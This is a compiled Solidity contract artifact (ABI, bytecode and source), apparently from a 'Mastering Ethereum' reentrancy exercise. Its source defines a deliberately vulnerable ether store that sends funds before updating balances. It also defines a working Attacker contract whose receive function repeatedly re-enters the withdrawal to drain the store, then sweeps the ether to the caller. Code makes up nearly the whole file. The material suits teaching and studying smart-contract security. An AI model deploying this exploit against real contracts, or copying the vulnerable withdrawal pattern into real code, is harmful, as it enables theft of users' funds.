{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "vulnerableEtherStore",
      "outputs": [
        {
          "internalType": "contract VulnerableEtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attackVulnerableEtherStore",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "collectEther",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103eb3803806103eb8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610357806100946000396000f3fe6080604052600436106100385760003560e01c80633d6f1cb51461011f578063432ddaad14610160578063ff11e1db1461016a5761011a565b3661011a57670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156101185760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100ff57600080fd5b505af1158015610113573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012b57600080fd5b50610134610181565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101686101a5565b005b34801561017657600080fd5b5061017f6102d8565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156101ba57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561022a57600080fd5b505af115801561023e573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156102be57600080fd5b505af11580156102d2573d6000803e3d6000fd5b50505050565b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561031e573d6000803e3d6000fd5b5056fea26469706673582212207eaaa6e740b1c048477f20ea80bc009bc7077a6c2ca5ef1f73d6ff31fd4de1df64736f6c63430007050033",
  "immutableReferences": {},
  "source": "pragma solidity 0.7.5;\n\ncontract VulnerableEtherStore {\n   \n   uint256 public withdrawalLimit = 1 ether;\n   mapping(address => uint256) public lastWithdrawalTime;\n   mapping(address => uint256) public balances;\n\n   function depositFunds() public payable {\n       balances[msg.sender] += msg.value;\n   }\n\n   function withdrawFunds(uint256 _weiToWithdraw) public {\n       require(balances[msg.sender] >= _weiToWithdraw);\n       require(_weiToWithdraw <= withdrawalLimit);\n\n       require(block.timestamp >= lastWithdrawalTime[msg.sender] + 1 weeks);\n       msg.sender.call{value:_weiToWithdraw}(\"\");\n       //require();\n       balances[msg.sender] -= _weiToWithdraw;\n       lastWithdrawalTime[msg.sender] = block.timestamp;\n   }\n   \n   function getBalance() external view returns(uint) {\n       return address(this).balance;\n   }\n}\n\ncontract Attacker {\n    VulnerableEtherStore public vulnerableEtherStore; \n\n    constructor(address _vulnerableAddress) {\n        vulnerableEtherStore = VulnerableEtherStore(_vulnerableAddress);\n    }\n\n    function attackVulnerableEtherStore() public payable {\n        require(msg.value >= 1 ether);\n\n        vulnerableEtherStore.depositFunds{value: 1 ether}();\n\n        vulnerableEtherStore.withdrawFunds(1 ether);\n    }\n\n    function collectEther() public {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    receive() payable external {\n        if(address(vulnerableEtherStore).balance > 1 ether) {\n            vulnerableEtherStore.withdrawFunds(1 ether);\n        }\n    }\n}",
  "sourcePath": "/Users/yusuf/Documents/Developer/workspaces/ethereum-projects/mastering-ethereum/reentrancy/contracts/Reentrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.7.5+commit.eb77ed08.Emscripten.clang"
  },
  "schemaVersion": "3.3.2",
  "updatedAt": "2021-02-18T20:59:24.053Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}